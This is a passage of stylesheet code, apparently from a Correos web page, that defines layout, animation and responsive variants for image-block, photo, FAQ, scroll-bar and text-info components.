				.sc-correos-cdk-imageblock-h figure.rectangle.sc-correos-cdk-imageblock:after {
					-webkit-transform: rotateY(180deg) scaleY(0.8);
					transform: rotateY(180deg) scaleY(0.8)
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-imageblock-h figure.rectangle.sc-correos-cdk-imageblock:after {
					-webkit-transform: rotateY(180deg);
					transform: rotateY(180deg)
				}
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-imageblock-h figure.rectangle.sc-correos-cdk-imageblock {
					margin-bottom: 0
				}
			}

			.sc-correos-cdk-imageblock-h figure.rectangle.sc-correos-cdk-imageblock img.sc-correos-cdk-imageblock {
				max-width: 400px
			}

			.sc-correos-cdk-imageblock-h figure.--animation.sc-correos-cdk-imageblock:after {
				-webkit-animation: slide-to-right 4s 1;
				animation: slide-to-right 4s 1
			}

			@-webkit-keyframes slide-to-right {
				from {
					right: -150%
				}

				to {
					right: 0
				}
			}

			@keyframes slide-to-right {
				from {
					right: -150%
				}

				to {
					right: 0
				}
			}

			@-webkit-keyframes slide-to-left {
				from {
					left: 150%
				}

				to {
					left: 0
				}
			}

			@keyframes slide-to-left {
				from {
					left: 150%
				}

				to {
					left: 0
				}
			}

			@-webkit-keyframes slide-to-medium-right {
				from {
					right: -150%
				}

				to {
					right: -32px
				}
			}

			@keyframes slide-to-medium-right {
				from {
					right: -150%
				}

				to {
					right: -32px
				}
			}

			@-webkit-keyframes slide-to-right-inverse {
				from {
					right: 150%
				}

				to {
					right: 0
				}
			}

			@keyframes slide-to-right-inverse {
				from {
					right: 150%
				}

				to {
					right: 0
				}
			}

			@-webkit-keyframes slide-to-medium-right-inverse {
				from {
					right: 150%
				}

				to {
					right: -32px
				}
			}

			@keyframes slide-to-medium-right-inverse {
				from {
					right: 150%
				}

				to {
					right: -32px
				}
			}

			@-webkit-keyframes slide-to-left-inverse {
				from {
					left: -150%
				}

				to {
					left: 0
				}
			}

			@keyframes slide-to-left-inverse {
				from {
					left: -150%
				}

				to {
					left: 0
				}
			}

			@-webkit-keyframes slide-to-left-border {
				from {
					left: 150%
				}

				to {
					left: 40px
				}
			}

			@keyframes slide-to-left-border {
				from {
					left: 150%
				}

				to {
					left: 40px
				}
			}

			@-webkit-keyframes slide-to-right-border {
				from {
					right: 150%
				}

				to {
					right: 40px
				}
			}

			@keyframes slide-to-right-border {
				from {
					right: 150%
				}

				to {
					right: 40px
				}
			}

			.sc-correos-cdk-imageblock-h figure.--animation.mediumMoon.sc-correos-cdk-imageblock:after {
				-webkit-animation: slide-to-left 4s 1;
				animation: slide-to-left 4s 1
			}

			.sc-correos-cdk-imageblock-h figure.--animation.squares.sc-correos-cdk-imageblock:after {
				-webkit-animation: slide-to-medium-right 4s 1;
				animation: slide-to-medium-right 4s 1
			}

			.sc-correos-cdk-imageblock-h figure.--animation.rectangle.sc-correos-cdk-imageblock:after {
				-webkit-animation: slide-to-left-border 4s 1;
				animation: slide-to-left-border 4s 1
			}

			.sc-correos-cdk-imageblock-h figure.--animation.--with-shape.sc-correos-cdk-imageblock {
				-webkit-animation: slide-to-right 2s 1;
				animation: slide-to-right 2s 1
			}

			@keyframes slide-to-right {
				from {
					right: -150%
				}

				to {
					right: 0
				}
			}

			.sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock .caption.sc-correos-cdk-imageblock {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.75rem;
				line-height: 1.175rem;
				margin-top: 16px;
				margin-bottom: 24px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock .caption.sc-correos-cdk-imageblock {
					font-size: 0.875rem;
					line-height: 1.25rem
				}
			}

			.sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock .caption--no-margin.sc-correos-cdk-imageblock {
				margin-bottom: 0
			}

			.sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
				width: 100%;
				min-height: 0
			}

			.sc-correos-cdk-imageblock-h img.circle.sc-correos-cdk-imageblock {
				-webkit-clip-path: circle(50%);
				clip-path: circle(50%)
			}

			.sc-correos-cdk-imageblock-h img.mediumMoon.sc-correos-cdk-imageblock {
				border-bottom-right-radius: 100%
			}

			.sc-correos-cdk-imageblock-h img.squares.sc-correos-cdk-imageblock {
				border-radius: 3%
			}

			.sc-correos-cdk-imageblock-h img.rectangle.sc-correos-cdk-imageblock {
				z-index: 2;
				border-radius: 3%
			}

			[cover-ajust=true].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				height: 100%
			}

			[cover-ajust=true].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
				height: 100%;
				-o-object-fit: cover;
				object-fit: cover
			}

			[variant=card-head].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				width: auto;
				height: 100%;
				max-width: 960px;
				max-height: 960px
			}

			[variant=card-head].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
				width: 100%;
				height: 100%;
				-o-object-fit: cover;
				object-fit: cover
			}

			[variant=article-modules].sc-correos-cdk-imageblock-h {
				-ms-flex-align: initial;
				align-items: initial
			}

			[variant=article-modules].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
				height: 100%;
				-o-object-fit: cover;
				object-fit: cover
			}

			[variant=article-modules][parent-size=sm].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				height: 224px
			}

			[variant=article-modules][parent-size=md].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock,
			[variant=article-modules][parent-size=lg].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				height: auto
			}

			[variant=article-modules][parent-size=lg].sc-correos-cdk-imageblock-h {
				position: relative
			}

			[variant=article-modules][parent-size=lg].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
				width: 100%;
				height: 100%;
				position: absolute
			}

			[variant=highlight-article-modules].sc-correos-cdk-imageblock-h {
				-ms-flex-align: initial;
				align-items: initial
			}

			[variant=highlight-article-modules].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				height: 144px
			}

			[variant=highlight-article-modules].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
				height: 100%;
				-o-object-fit: cover;
				object-fit: cover
			}

			[variant=highlight-article-modules][parent-size=md].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				height: 272px
			}

			[variant=highlight-article-modules][parent-size=lg].sc-correos-cdk-imageblock-h {
				position: relative
			}

			[variant=highlight-article-modules][parent-size=lg].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				height: auto
			}

			[variant=highlight-article-modules][parent-size=lg].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
				width: 100%;
				height: 100%;
				position: absolute
			}

			@media (min-width: 1024px) {
				[variant=podcast].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
					border-radius: 8px
				}
			}

			[variant=with-border-radius].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				border-radius: 8px
			}

			[variant=with-logo].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				width: 100%
			}

			@media (min-width: 1024px) {
				[variant=with-logo].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
					border-radius: 8px
				}
			}

			[variant=with-logo].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
				height: auto;
				width: 100%
			}

			@media (min-width: 640px) {
				[variant=with-logo].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
					width: auto;
					padding: inherit
				}
			}

			@media (min-width: 1024px) {
				[variant=with-logo].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
					width: auto;
					padding: inherit
				}
			}

			.sc-correos-cdk-imageblock-h .ui-img-logo-container.sc-correos-cdk-imageblock {
				position: absolute;
				left: 16px;
				bottom: 0;
				width: 80px
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-imageblock-h .ui-img-logo-container.sc-correos-cdk-imageblock {
					left: 20px;
					width: 150px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-imageblock-h .ui-img-logo-container.sc-correos-cdk-imageblock {
					left: 24px;
					width: 200px
				}
			}

			.sc-correos-cdk-imageblock-h .cdk-border-radius-img.sc-correos-cdk-imageblock {
				border-radius: 8px
			}

			.sc-correos-cdk-imageblock-h .ui-img-logo-container-inner.sc-correos-cdk-imageblock {
				position: -webkit-sticky;
				position: sticky;
				margin-bottom: 16px;
				border: 1px solid var(--_cdk-imageblock-border-radius);
				border-radius: 8px;
				background-color: var(--_cdk-imageblock-background-color);
				padding: 5px;
				height: 80px;
				max-height: 80px;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				-ms-flex-pack: center;
				justify-content: center
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-imageblock-h .ui-img-logo-container-inner.sc-correos-cdk-imageblock {
					height: 150px;
					max-height: 150px;
					margin-bottom: 20px;
					padding: 10px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-imageblock-h .ui-img-logo-container-inner.sc-correos-cdk-imageblock {
					height: 200px;
					max-height: 200px;
					margin-bottom: 24px;
					padding: 20px
				}
			}

			.sc-correos-cdk-imageblock-h .ui-img-logo-container-inner.sc-correos-cdk-imageblock img.sc-correos-cdk-imageblock {
				height: auto;
				width: auto
			}

			.sc-correos-cdk-imageblock-h .hidden.sc-correos-cdk-imageblock {
				display: none
			}

			[variant=image-contains].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				height: 100%
			}

			[variant=image-contains].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
				height: 100%;
				-o-object-fit: contain;
				object-fit: contain
			}

			[variant=image-contains-small].sc-correos-cdk-imageblock-h figure.sc-correos-cdk-imageblock {
				height: 80%;
				border-radius: 8px
			}

			[variant=image-contains-small].sc-correos-cdk-imageblock-h img.sc-correos-cdk-imageblock {
				height: 80%;
				-o-object-fit: contain;
				object-fit: contain
			}

			[distribution=reverse].sc-correos-cdk-imageblock-h figure.--with-shape.sc-correos-cdk-imageblock {
				left: 0
			}

			[distribution=reverse].sc-correos-cdk-imageblock-h figure.rectangle.sc-correos-cdk-imageblock:after {
				-webkit-transform: rotateY(0deg) scaleY(0.5);
				transform: rotateY(0deg) scaleY(0.5);
				left: initial;
				right: 40px
			}

			@media (min-width: 640px) {
				[distribution=reverse].sc-correos-cdk-imageblock-h figure.rectangle.sc-correos-cdk-imageblock:after {
					-webkit-transform: rotateY(0deg) scaleY(0.8);
					transform: rotateY(0deg) scaleY(0.8)
				}
			}

			@media (min-width: 1024px) {
				[distribution=reverse].sc-correos-cdk-imageblock-h figure.rectangle.sc-correos-cdk-imageblock:after {
					-webkit-transform: rotateY(0deg);
					transform: rotateY(0deg)
				}
			}

			[distribution=reverse].sc-correos-cdk-imageblock-h figure.--animation.--with-shape.sc-correos-cdk-imageblock {
				-webkit-animation: slide-to-left-inverse 2s 1;
				animation: slide-to-left-inverse 2s 1
			}

			[distribution=reverse].sc-correos-cdk-imageblock-h figure.--animation.sc-correos-cdk-imageblock:after {
				-webkit-animation: slide-to-right-inverse 4s 1;
				animation: slide-to-right-inverse 4s 1
			}

			[distribution=reverse].sc-correos-cdk-imageblock-h figure.--animation.squares.sc-correos-cdk-imageblock:after {
				-webkit-animation: slide-to-medium-right-inverse 4s 1;
				animation: slide-to-medium-right-inverse 4s 1
			}

			[distribution=reverse].sc-correos-cdk-imageblock-h figure.--animation.rectangle.sc-correos-cdk-imageblock:after {
				-webkit-animation: slide-to-right-border 4s 1;
				animation: slide-to-right-border 4s 1
			}

			[distribution=reverse].sc-correos-cdk-imageblock-h figure.--animation.mediumMoon.sc-correos-cdk-imageblock:after {
				-webkit-animation: slide-to-left-inverse 4s 1;
				animation: slide-to-left-inverse 4s 1
			}
		</style>
		<style>
			.sc-correos-cdk-full-content-photo-h {
				--_cdk-full-content-photo-bg-color-textblock: var(--cdk-full-content-photo-bg-color-textblock, #ffffff);
				--_cdk-full-content-photo-border-textblock: var(--cdk-full-content-photo-border-color-textblock, #cbcbcb);
				--_cdk-full-content-photo-box-shadow-textblock: 0 10px 20px 0 rgba(0, 0, 0, 0.1);
				--_wrapper: var(--cdk-full-content-photo-layout-wrapper, 1366)
			}

			.sc-correos-cdk-full-content-photo-h {
				display: block;
				margin-left: 24px;
				width: calc(100% - 48px);
				position: relative;
				padding: 40px 0;
				overflow-x: hidden
			}

			.--extra-pd.sc-correos-cdk-full-content-photo-h {
				padding-bottom: 80px
			}

			.sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
				border: 1px solid var(--_cdk-full-content-photo-border-textblock);
				border-radius: 8px;
				background-color: var(--_cdk-full-content-photo-bg-color-textblock);
				-webkit-box-shadow: var(--_cdk-full-content-photo-box-shadow-textblock);
				box-shadow: var(--_cdk-full-content-photo-box-shadow-textblock);
				padding: 24px 16px
			}

			.sc-correos-cdk-full-content-photo-h .cdk-decorator.sc-correos-cdk-full-content-photo {
				display: none
			}

			.sc-correos-cdk-full-content-photo-h .cdk-figure.sc-correos-cdk-full-content-photo {
				margin: 0;
				padding: 0;
				border: 0;
				font-size: 100%;
				font: inherit;
				vertical-align: baseline
			}

			.sc-correos-cdk-full-content-photo-h .cdk-subtext.sc-correos-cdk-full-content-photo {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				padding: 17px;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center;
				color: #333333;
				display: flex;
				-ms-flex-pack: start;
				justify-content: flex-start;
				font-size: 0.75rem;
				line-height: 1.175rem;
				font-weight: 300;
				width: 100%
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-full-content-photo-h .cdk-subtext.sc-correos-cdk-full-content-photo {
					font-size: 0.875rem;
					line-height: 1.25rem
				}
			}

			.sc-correos-cdk-full-content-photo-h .sc-correos-cdk-full-content-photo-s>[slot=subtext] {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				padding: 17px;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: center;
				justify-content: center;
				color: #333333;
				display: flex;
				-ms-flex-pack: start;
				justify-content: flex-start;
				font-size: 0.75rem;
				line-height: 1.175rem;
				font-weight: 300;
				width: 100%
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-full-content-photo-h .sc-correos-cdk-full-content-photo-s>[slot=subtext] {
					font-size: 0.875rem;
					line-height: 1.25rem
				}
			}

			[size=sm].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
				padding: 24px 10%
			}

			.sc-correos-cdk-full-content-photo-h[size=sm] .sc-correos-cdk-full-content-photo-s>[slot=subtext] {
				padding: 32px
			}

			[size=md].sc-correos-cdk-full-content-photo-h,
			[size=lg].sc-correos-cdk-full-content-photo-h {
				width: 100%;
				display: -ms-flexbox;
				display: flex;
				margin-left: 0
			}

			[size=md].sc-correos-cdk-full-content-photo-h .cdk-img.sc-correos-cdk-full-content-photo,
			[size=lg].sc-correos-cdk-full-content-photo-h .cdk-img.sc-correos-cdk-full-content-photo {
				background-repeat: no-repeat;
				background-size: cover;
				background-position: center center;
				-ms-flex: 1 1 50%;
				flex: 1 1 50%;
				border-radius: 8px
			}

			[size=md].sc-correos-cdk-full-content-photo-h .cdk-content.sc-correos-cdk-full-content-photo,
			[size=lg].sc-correos-cdk-full-content-photo-h .cdk-content.sc-correos-cdk-full-content-photo {
				-ms-flex: 1 1 50%;
				flex: 1 1 50%;
				padding-bottom: 3rem
			}

			[size=md].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo,
			[size=lg].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
				width: calc(100% + 7rem - 24px);
				height: 100%;
				max-width: calc(var(--_wrapper) / 2 + 7rem - 24px);
				position: relative;
				left: -7rem;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-webkit-box-sizing: border-box;
				box-sizing: border-box
			}

			.sc-correos-cdk-full-content-photo-h[size=md] .sc-correos-cdk-full-content-photo-s>[slot=textblock],
			.sc-correos-cdk-full-content-photo-h[size=lg] .sc-correos-cdk-full-content-photo-s>[slot=textblock] {
				max-width: 40rem;
				width: 100%;
				margin-left: auto;
				margin-right: auto
			}

			[size=md].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
				padding: 24px 15%
			}

			.sc-correos-cdk-full-content-photo-h[size=md] .sc-correos-cdk-full-content-photo-s>[slot=subtext] {
				width: 80%
			}

			[size=lg].sc-correos-cdk-full-content-photo-h {
				padding: 0
			}

			[size=lg].--extra-pd.sc-correos-cdk-full-content-photo-h {
				padding-bottom: 80px
			}

			[size=lg].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
				max-width: calc(var(--_wrapper) / 2 + 9rem - 24px);
				width: calc(100% + 9rem - 24px);
				left: -9rem;
				padding: 48px 112px
			}

			[size=lg].sc-correos-cdk-full-content-photo-h .cdk-content.sc-correos-cdk-full-content-photo {
				padding-bottom: 4.6rem
			}

			[size=lg].sc-correos-cdk-full-content-photo-h .cdk-decorator.sc-correos-cdk-full-content-photo {
				display: block;
				position: absolute;
				bottom: -4.5rem;
				right: -19rem;
				pointer-events: none
			}

			.sc-correos-cdk-full-content-photo-h[size=lg] .sc-correos-cdk-full-content-photo-s>[slot=subtext] {
				width: 60%
			}

			[content-padding=false].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
				padding: 0
			}

			.sc-correos-cdk-full-content-photo-h[content-padding=false] .sc-correos-cdk-full-content-photo-s>[slot=textblock] {
				max-width: unset;
				margin: 0
			}

			.sc-correos-cdk-full-content-photo-h[subtext-color=white] .sc-correos-cdk-full-content-photo-s>[slot=subtext] {
				color: white
			}

			[theme=inverse].sc-correos-cdk-full-content-photo-h {
				-ms-flex-direction: row-reverse;
				flex-direction: row-reverse;
				padding-left: calc((100% - var(--_wrapper)) / 2);
				width: calc(100% - 48px)
			}

			[theme=inverse][size=md].sc-correos-cdk-full-content-photo-h,
			[theme=inverse][size=lg].sc-correos-cdk-full-content-photo-h {
				width: 100%
			}

			[theme=inverse][size=md].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo,
			[theme=inverse][size=lg].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
				left: 0rem;
				width: 124%
			}

			.sc-correos-cdk-full-content-photo-h[theme=inverse][size=md] .sc-correos-cdk-full-content-photo-s>[slot=subtext],
			.sc-correos-cdk-full-content-photo-h[theme=inverse][size=lg] .sc-correos-cdk-full-content-photo-s>[slot=subtext] {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: end;
				justify-content: flex-end
			}

			[theme=inverse][size=lg].sc-correos-cdk-full-content-photo-h .cdk-textblock.sc-correos-cdk-full-content-photo {
				max-width: none
			}

			[theme=inverse][size=lg][variant=with-decorator].sc-correos-cdk-full-content-photo-h .cdk-decorator.sc-correos-cdk-full-content-photo {
				left: -19rem
			}
		</style>
		<style>
			.sc-correos-cdk-faqs-h {
				display: block
			}

			.sc-correos-cdk-faqs-h .sc-correos-cdk-faqs-s>[slot=faqs] {
				visibility: hidden
			}

			.sc-correos-cdk-faqs-h .sc-correos-cdk-faqs-s>[slot=faqs] .slide-in-bottom {
				-webkit-animation: slide-in-bottom 1.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) 1s both;
				animation: slide-in-bottom 1.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) 1s both
			}

			@-webkit-keyframes slide-in-bottom {
				0% {
					-webkit-transform: translateY(300px);
					transform: translateY(300px);
					opacity: 0
				}

				100% {
					-webkit-transform: translateY(0);
					transform: translateY(0);
					opacity: 1
				}
			}

			@keyframes slide-in-bottom {
				0% {
					-webkit-transform: translateY(300px);
					transform: translateY(300px);
					opacity: 0
				}

				100% {
					-webkit-transform: translateY(0);
					transform: translateY(0);
					opacity: 1
				}
			}
		</style>
		<style>
			.sc-correos-ui-scroll-bar-h {
				display: block;
				position: relative;
				height: 100%;
				padding: 0;
				overflow-anchor: none;
				-ms-overflow-style: none;
				touch-action: auto;
				-ms-touch-action: auto
			}
		</style>
		<style>
			.sc-correos-ui-text-inf-h {
				--_ui-text-inf-color-title: var(--ui-text-inf-color-title, red);
				--_ui-text-inf-border-title: 1px solid var(--ui-text-inf-border-color-title, blue);
				--_ui-text-inf-color-text: 1px solid var(--ui-text-inf-color-text, magenta);
				--_ui-text-inf-link-color: var(--ui-text-inf-link-color, blue);
				--_ui-text-inf-border-title-lab: 1px solid var(--ui-text-inf-border-color-title-lab, blue)
			}

			.sc-correos-ui-text-inf-h {
				display: block
			}

			.sc-correos-ui-text-inf-h .ui-footer.sc-correos-ui-text-inf {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap
			}

			.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=title] {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				border-bottom: var(--_ui-text-inf-border-title);
				font-weight: 300;
				margin-bottom: 15px;
				padding-bottom: 16px;
				font-size: 2rem
			}

			.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=text] {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 1rem;
				line-height: 1.5rem;
				color: var(--_ui-text-inf-color-text);
				font-weight: 300;
				margin-bottom: 16px
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=text] {
					font-size: 1.125rem;
					line-height: 1.875rem
				}
			}

			.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=text]>div:first-child {
				margin: 16px 0
			}

			.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkright],
			.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkleft],
			.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkextra] {
				margin-right: 16px
			}

			.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkright] .ui-img,
			.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkleft] .ui-img,
			.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkextra] .ui-img {
				height: 48px;
				width: 152px
			}

			.sc-correos-ui-text-inf-h .sc-correos-ui-text-inf-s>[slot=linkextra]:empty {
				display: none
			}

			[size=sm].sc-correos-ui-text-inf-h .ui-footer.sc-correos-ui-text-inf,
			[size=md].sc-correos-ui-text-inf-h .ui-footer.sc-correos-ui-text-inf,
			[size=lg].sc-correos-ui-text-inf-h .ui-footer.sc-correos-ui-text-inf {
				-ms-flex-direction: row;
				flex-direction: row
			}

			.sc-correos-ui-text-inf-h[size=sm] .sc-correos-ui-text-inf-s>[slot=linkright],
			.sc-correos-ui-text-inf-h[size=md] .sc-correos-ui-text-inf-s>[slot=linkright],
			.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkright] {
				margin-top: 0
			}

			.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkleft],
			.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkright],
			.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkextra] {
				margin-right: 24px
			}

			.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkright] .ui-img,
			.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkleft] .ui-img,
			.sc-correos-ui-text-inf-h[size=lg] .sc-correos-ui-text-inf-s>[slot=linkextra] .ui-img {
				height: 56px;
				width: 192px
			}

			[variant=download].sc-correos-ui-text-inf-h .ui-link.sc-correos-ui-text-inf {
				margin-bottom: 16px
			}

			@media (min-width: 1024px) {
				[variant=download].sc-correos-ui-text-inf-h .ui-link.sc-correos-ui-text-inf {
					margin-bottom: 16px
				}
			}

			.sc-correos-ui-text-inf-h[variant=download] .sc-correos-ui-text-inf-s>[slot=title] {
				font-size: 1.5rem;
				line-height: 2.25rem;
				border-bottom: none;
				margin-bottom: 0;
				padding-bottom: 8px;
				line-height: 2.25rem;
				font-weight: normal
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-text-inf-h[variant=download] .sc-correos-ui-text-inf-s>[slot=title] {
					font-size: 2rem;
					line-height: 2.75rem
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-text-inf-h[variant=download] .sc-correos-ui-text-inf-s>[slot=title] {
					line-height: 3rem
				}
			}

			.sc-correos-ui-text-inf-h[variant=download] .sc-correos-ui-text-inf-s>[slot=text] {
				font-size: 0.875rem;
				line-height: 1.375rem
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-text-inf-h[variant=download] .sc-correos-ui-text-inf-s>[slot=text] {
					font-size: 1rem;
					line-height: 1.5rem
				}
			}

			.sc-correos-ui-text-inf-h[variant=basic] .sc-correos-ui-text-inf-s>[slot=title] {
				font-size: 1.5rem;
				line-height: 2.25rem;
				border-bottom: none;
				margin-bottom: 8px;
				padding-bottom: 0;
				font-weight: normal
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-text-inf-h[variant=basic] .sc-correos-ui-text-inf-s>[slot=title] {
					font-size: 2rem;
					line-height: 2.75rem
				}
			}

			.sc-correos-ui-text-inf-h[variant=basic] .sc-correos-ui-text-inf-s>[slot=text] {
				font-size: 1rem;
				line-height: 1.5rem
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-text-inf-h[variant=basic] .sc-correos-ui-text-inf-s>[slot=text] {
					font-size: 1.125rem;
					line-height: 1.875rem
				}
			}

			.sc-correos-ui-text-inf-h[variant=basic-reduced] .sc-correos-ui-text-inf-s>[slot=title] {
				font-size: 1.125rem;
				line-height: 1.625rem;
				border-bottom: none;
				margin-bottom: 8px;
				padding-bottom: 0;
				font-weight: normal
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-text-inf-h[variant=basic-reduced] .sc-correos-ui-text-inf-s>[slot=title] {
					font-size: 1.5rem;
					line-height: 2.25rem
				}
			}

			.sc-correos-ui-text-inf-h[variant=basic-reduced] .sc-correos-ui-text-inf-s>[slot=text] {
				font-size: 1rem;
				line-height: 1.5rem
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-text-inf-h[variant=basic-reduced] .sc-correos-ui-text-inf-s>[slot=text] {
					font-size: 1.125rem;
					line-height: 1.875rem
				}
			}

			[variant=features].sc-correos-ui-text-inf-h .ui-features.sc-correos-ui-text-inf,
			[variant=download].sc-correos-ui-text-inf-h .ui-features.sc-correos-ui-text-inf,
			[variant=prepaid].sc-correos-ui-text-inf-h .ui-features.sc-correos-ui-text-inf {
				list-style: none;
				padding: 0
			}

			[variant=features].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf,
			[variant=download].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf,
			[variant=prepaid].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf {
				display: -ms-flexbox;
				display: flex;
				margin: 24px 0
			}

			[variant=features].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-icon.sc-correos-ui-text-inf,
			[variant=download].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-icon.sc-correos-ui-text-inf,
			[variant=prepaid].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-icon.sc-correos-ui-text-inf {
				color: var(--_ui-list-icon-color-icon);
				margin-right: 8px;
				width: 18px;
				height: 24px;
				font-size: 18px
			}

			@media (min-width: 1024px) {

				[variant=features].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-icon.sc-correos-ui-text-inf,
				[variant=download].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-icon.sc-correos-ui-text-inf,
				[variant=prepaid].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-icon.sc-correos-ui-text-inf {
					margin-right: 19px
				}
			}

			[variant=features].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-icon--title.sc-correos-ui-text-inf,
			[variant=download].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-icon--title.sc-correos-ui-text-inf,
			[variant=prepaid].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-icon--title.sc-correos-ui-text-inf {
				height: 36px
			}

			[variant=features].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item.sc-correos-ui-text-inf,
			[variant=download].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item.sc-correos-ui-text-inf,
			[variant=prepaid].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item.sc-correos-ui-text-inf {
				margin-top: 4px
			}

			@media (min-width: 1024px) {

				[variant=features].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item.sc-correos-ui-text-inf,
				[variant=download].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item.sc-correos-ui-text-inf,
				[variant=prepaid].sc-correos-ui-text-inf-h .ui-main-item.sc-correos-ui-text-inf .ui-item.sc-correos-ui-text-inf {
					margin-top: 0
				}
			}

